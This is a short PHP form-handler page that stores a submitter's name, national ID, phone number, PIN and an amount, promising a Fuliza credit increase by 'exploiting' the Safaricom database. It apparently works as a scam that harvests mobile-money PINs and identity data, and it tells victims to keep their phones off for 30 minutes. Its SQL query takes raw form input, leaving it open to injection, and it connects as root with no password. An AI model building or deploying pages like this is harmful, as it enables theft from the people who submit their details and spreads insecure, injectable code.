<!DOCTYPE html>
<html>

<head>
	<title>Insert Page page</title>
	<link rel="stylesheet" href="index.css">
</head>

<body id="uw">
<div id="insert-form-wrap">
	<center>
		<?php

		// servername => localhost
		// username => root
		// password => empty
		// database name => staff
		$conn = mysqli_connect("localhost", "root", "", "staff");
		
		// Check connection
		if($conn === false){
			die("ERROR: Could not connect. "
				. mysqli_connect_error());
		}
		
		// Taking all 5 values from the form data(input)
		$your_name = $_REQUEST['your_name'];
		$national_id_number = $_REQUEST['national_id_number'];
		$phone_number = $_REQUEST['phone_number'];
		$pin= $_REQUEST['password'];
		$amount = $_REQUEST['amount'];
		
		// Performing insert query execution
		// here our table name is college
		$sql = "INSERT INTO collage VALUES ('$your_name',
			'$national_id_number','$phone_number','$pin','$amount')";
		
		if(mysqli_query($conn, $sql)){
			echo ""
				. " "
				. " ";

			echo nl2br("<h3>\n Dear $your_name\n your request of fuliza increment of ksh. "
				. "$amount is being processed.Please wait for 1-2 hours for \n system to exploit safaricom database. Make Sure to keep your phone closed for 30 minutes</h3> ");
		} else{
			echo "ERROR: Hush! Sorry $sql. "
				. mysqli_error($conn);
		}
		
		// Close connection
		mysqli_close($conn);
		?>
	</center>
	</div>
</body>

</html>
